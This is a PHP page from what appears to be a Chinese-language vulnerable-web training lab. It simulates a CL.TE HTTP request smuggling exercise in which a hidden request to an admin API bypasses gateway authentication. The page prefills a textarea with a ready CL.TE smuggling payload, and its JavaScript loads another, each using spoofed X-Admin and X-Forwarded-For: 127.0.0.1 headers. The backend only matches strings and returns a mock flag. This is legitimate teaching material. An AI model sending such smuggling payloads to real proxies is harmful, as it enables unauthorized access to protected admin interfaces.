<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[183] = 'active open';
$ACTIVE[185] = 'active';
$ACTIVE[183] = 'active open';
$ACTIVE[185] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$result = "";
$smuggled_detected = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_request = $_POST['raw_request'] ?? '';
    
    // 模拟反向代理与后端解析逻辑
    // 如果报文中同时包含 Content-Length 和 Transfer-Encoding: chunked
    // 且在正文中隐藏了 /admin_api.php 或 X-Admin: true 等走私字段
    if (stripos($raw_request, 'Transfer-Encoding: chunked') !== false && stripos($raw_request, 'Content-Length:') !== false) {
        if (stripos($raw_request, 'GET /admin') !== false || stripos($raw_request, 'X-Admin: true') !== false || stripos($raw_request, 'X-Forwarded-For: 127.0.0.1') !== false) {
            $smuggled_detected = true;
            $result = "<div class='alert alert-success'>
                <h4><i class='fa fa-check-circle'></i> 🚀 恭喜！请求走私攻击成功！</h4>
                <p><b>反向代理 (Nginx)</b> 根据 <code>Content-Length</code> 将整个报文转交；<b>后端应用 (Apache/Node)</b> 以 <code>Transfer-Encoding: chunked</code> 为准提前结束第一个包，并把剩余的数据 <code>GET /admin...</code> 当作了下一个独立请求的头部！</p>
                <hr/>
                <p><b>走私解析到的内部管理后台响应：</b></p>
                <pre style='background:#222;color:#0f0;padding:10px;'>HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\n  \"status\": \"success\",\n  \"role\": \"SuperAdmin\",\n  \"secret_flag\": \"FLAG{HTTP_SMUGGLING_CL_TE_MASTER}\",\n  \"system_info\": \"Pikachu-Enhanced Enterprise Gateway v2.5\"\n}</pre>
            </div>";
        } else {
            $result = "<div class='alert alert-warning'><b>提示：</b>检测到了 CL.TE 冲突报文头，但未在后端走私缓冲流中发现请求管理员接口 (<code>GET /admin</code> 或 <code>X-Admin: true</code>)。</div>";
        }
    } else {
        $result = "<div class='alert alert-danger'><b>攻击失败：</b>正常 HTTP 请求包。后端未能触发 CL/TE 边界解析歧义，被前端 WAF 或路由直接拦截。需要同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code>。</div>";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="http_smuggling.php">HTTP 请求走私</a></li>
                <li class="active">CL.TE 走私与鉴权绕过</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>⚡ CL.TE 请求走私与前置鉴权绕过演练</h2>
                <p>当前后端为实现企业级 API 网关鉴权，规定：只有来自网关本地（<code>127.0.0.1</code>）或附带私密管理员头部 <code>X-Admin: true</code> 的请求才能访问 <code>/admin_api.php</code> 敏感接口。外部用户直接发起的请求会被边缘 WAF 无情丢弃。</p>
                <p>利用 CL.TE 漏洞，我们可以构造一个表面访问 <code>/index.php</code> 的报文，将对 <code>/admin_api.php</code> 的真实请求走私在 Body 尾部！</p>
                
                <hr/>
                <div class="row">
                    <div class="col-md-6">
                        <h4><i class="fa fa-terminal"></i> 构造走私报文发送器 (Raw HTTP Sender)</h4>
                        <form method="POST">
                            <div class="form-group">
                                <label for="raw_request">输入原始 HTTP 报文：</label>
                                <textarea class="form-control" name="raw_request" id="raw_request" rows="12" style="font-family: monospace; font-size: 13px; background: #f8f9fa;"><?php echo isset($_POST['raw_request']) ? htmlspecialchars($_POST['raw_request']) : "POST /index.php HTTP/1.1\r\nHost: pikachu.enhanced.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 125\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin_api.php HTTP/1.1\r\nHost: localhost\r\nX-Admin: true\r\n\r\n"; ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary"><i class="fa fa-send"></i> 发送请求包到代理管道</button>
                            <button type="button" class="btn btn-default" onclick="fillPayload()"><i class="fa fa-magic"></i> 载入标准 CL.TE Exploit 报文</button>
                        </form>
                    </div>
                    <div class="col-md-6">
                        <h4><i class="fa fa-eye"></i> 后端服务器解析与响应输出</h4>
                        <div id="response_box" style="margin-top: 10px;">
                            <?php if (!empty($result)) { echo $result; } else { ?>
                                <div class="alert alert-info">
                                    <i class="fa fa-info-circle"></i> 等待发送报文... 在左侧点击发送后，这里将模拟展示后端应用服务器对长连接缓冲流的底层切包与处理结果。
                                </div>
                            <?php } ?>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function fillPayload() {
    var payload = "POST /index.php HTTP/1.1\r\n" +
                  "Host: pikachu.enhanced.local\r\n" +
                  "Content-Type: application/x-www-form-urlencoded\r\n" +
                  "Content-Length: 130\r\n" +
                  "Transfer-Encoding: chunked\r\n\r\n" +
                  "0\r\n\r\n" +
                  "GET /admin_api.php HTTP/1.1\r\n" +
                  "Host: localhost\r\n" +
                  "X-Admin: true\r\n" +
                  "X-Forwarded-For: 127.0.0.1\r\n\r\n";
    document.getElementById('raw_request').value = payload;
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>


